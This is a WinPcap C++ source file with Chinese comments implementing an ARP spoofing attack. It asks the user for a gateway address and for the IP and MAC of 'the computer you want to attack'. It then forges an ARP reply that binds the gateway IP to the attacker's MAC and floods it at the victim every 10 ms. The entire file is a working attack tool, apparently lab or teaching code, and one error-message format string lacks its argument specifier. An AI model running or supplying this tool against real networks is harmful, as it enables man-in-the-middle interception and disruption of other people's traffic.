// wpcap_4.cpp : Defines the entry point for the console application.
// 程序功能：本程序在计算机A上运行，它可以将B发给C的数据包

#include "stdafx.h"

#define _W64
#define HAVE_REMOTE
#include <pcap.h>

struct arp_packet
{
  unsigned short int hardware_type;   // 硬件类型
  unsigned short int protocol_type;   // 协议类型
  unsigned char mac_addr_len;         // 硬件地址长度
  unsigned char ip_addr_len;          // 协议地址长度
  unsigned short int operation_type;  // OP（操作）
  unsigned char MAC_source[6];        // 发送源以太网地址
  unsigned char ip_source[4];         // 发送源IP地址
  unsigned char MAC_dst[6];           // 目的以太网地址
  unsigned char ip_dst[4];            // 目的IP地址
};

// TODO 交换字节的函数
void swap_byte(unsigned short int *para)
{
  unsigned char temp;

  temp = ((unsigned char *)para)[0];
  ((unsigned char *)para)[0] = ((unsigned char *)para)[1];
  ((unsigned char *)para)[1] = temp;
}

void main(int argc, char **argv)
{
  pcap_t *fp;
  char errbuf[PCAP_ERRBUF_SIZE];
  u_char packet[100];
  int i;
  struct arp_packet arp_reply;
  unsigned int temp_int;

  // TODO 判断是否输入了网卡参数
  if (argc != 2)
  {
    printf("usage: %s interface (e.g., rpcap://DEVICENAME. DEVICENAME can be obtained through pcap_findalldevs_ex())\n",
           argv[0]);
    return;
  }

  arp_reply.hardware_type = 1;
  arp_reply.protocol_type = 0x0800;
  arp_reply.operation_type = 2;
  swap_byte(&arp_reply.hardware_type);
  swap_byte(&arp_reply.protocol_type);
  swap_byte(&arp_reply.operation_type);

  arp_reply.mac_addr_len = 6;
  arp_reply.ip_addr_len = 4;

  // TODO 这里开始是需要用户输入的的信息，确定网关、被攻击者的IP和MAC
  printf("please input the IP address of the gateway(e.g., 192.168.1.1): \n");
  scanf("%d.%d.%d.%d", &arp_reply.ip_source[0], &arp_reply.ip_source[1], &arp_reply.ip_source[2], &arp_reply.ip_source[3]);
  printf("The gateway address you input is: \t %d.%d.%d.%d\n", arp_reply.ip_source[0], arp_reply.ip_source[1],
         arp_reply.ip_source[2], arp_reply.ip_source[3]);

  printf("please input the MAC address of your computer network work interface: \n");
  for (i = 0; i < 6; i++)
  {
    scanf("%x", &temp_int);
    arp_reply.MAC_source[i] = temp_int;
  }
  printf("The MAC address you've entered is: \n");
  for (i = 0; i < 6; i++)
  {
    printf("%x ", arp_reply.MAC_source[i]);
  }
  printf("\n");

  printf("please input the IP address of the computer you want to attack(e.g., 192.168.1.101): \n");
  scanf("%d.%d.%d.%d", &arp_reply.ip_dst[0], &arp_reply.ip_dst[1], &arp_reply.ip_dst[2], &arp_reply.ip_dst[3]);
  printf("The IP address of the computer you want to attack is: \t %d.%d.%d.%d\n",
         arp_reply.ip_dst[0], arp_reply.ip_dst[1],
         arp_reply.ip_dst[2], arp_reply.ip_dst[3]);

  printf("please input the MAC address of the computer you want to attack: \n");
  for (i = 0; i < 6; i++)
  {
    scanf("%x", &temp_int);
    arp_reply.MAC_dst[i] = temp_int;
  }
  printf("The MAC address you've entered is: \n");
  for (i = 0; i < 6; i++)
  {
    printf("%x ", arp_reply.MAC_dst[i]);
  }
  printf("\n");

  if ((fp = pcap_open(argv[1],
                      100,
                      0,
                      1000,
                      NULL,
                      errbuf)) == NULL)
  {
    fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", argv[1]);
    return;
  }

  // TODO 以下代码是构造ARP报文格式的代码
  for (i = 0; i < 6; i++)
  {
    packet[6 + i] = arp_reply.MAC_source[i];
    packet[i] = arp_reply.MAC_dst[i];
  }

  packet[12] = 0x08;
  packet[13] = 0x06;

  memcpy(packet + 14, &arp_reply, sizeof(struct arp_packet));
  for (i = 14 + sizeof(struct arp_packet); i < 100; i++)
  {
    packet[i] = 0;
  }

  for (i = 0; i < 100; i++)
  {
    if (i != 0 && i % 16 == 0)
    {
      printf("\n");
    }
    printf("%02x ", packet[i]);
  }

  while (1)
  {
    // TODO 向被攻击方发送数据包
    if (pcap_sendpacket(fp, packet, 100) != 0)
    {
      fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(fp));
      return;
    }

    Sleep(10);
  }
  return;
}
